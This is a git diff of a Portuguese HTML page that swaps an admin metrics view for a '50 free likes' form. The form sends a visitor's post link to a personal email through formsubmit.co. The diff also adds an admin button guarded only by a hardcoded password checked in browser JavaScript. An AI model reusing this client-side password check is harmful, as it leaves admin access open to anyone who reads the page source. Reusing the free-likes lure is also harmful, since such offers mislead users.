@@ -3,33 +3,30 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Admin - Métricas</title>
+  <title>50 Curtidas Gratuitas</title>
   <link rel="stylesheet" href="styles.css">
 </head>
 <body>
-  <h1>Métricas</h1>
-  <div>
-    <p>Total de cliques no botão: <span id="clickCount">0</span></p>
-    <p>Total de visitas na página: <span id="visitCount">0</span></p>
-  </div>
+  <h1 class="title">50 CURTIDAS GRATUITAS</h1>
+  <form id="likesForm" action="https://formsubmit.co/vinniciuslopes12@gmail.com" method="POST">
+    <input type="text" id="linkInput" name="link" placeholder="Digite o link da sua publicação" required>
+    <input type="hidden" name="_subject" value="Novo envio!">
+    <input type="hidden" name="_captcha" value="false">
+    <input type="hidden" id="nextInput" name="_next" value="https://yourdomain.co/thanks.html"> <!-- Mude o redirecionamento da API aqui -->
+    <button type="submit" id="submitButton">Obter Curtidas</button>
+  </form>
+
+  <button onclick="promptPassword()" class="admin-button">Admin</button>
 
   <script>
-    // Função para atualizar métricas
-    function updateMetrics() {
-      var clickCount = localStorage.getItem('clickCount') || 0;
-      var visitCount = localStorage.getItem('visitCount') || 0;
-
-      document.getElementById('clickCount').textContent = clickCount;
-      document.getElementById('visitCount').textContent = visitCount;
+    function promptPassword() {
+      var password = prompt('Digite a senha de administração:');
+      if (password === '1067') {
+        location.href = 'admin.html';
+      } else {
+        alert('Senha incorreta.');
+      }
     }
-
-    // Incrementar visitas na página
-    window.onload = function() {
-      var visitCount = localStorage.getItem('visitCount') || 0;
-      visitCount = parseInt(visitCount) + 1;
-      localStorage.setItem('visitCount', visitCount);
-      updateMetrics();
-    };
   </script>
 </body>
 </html>
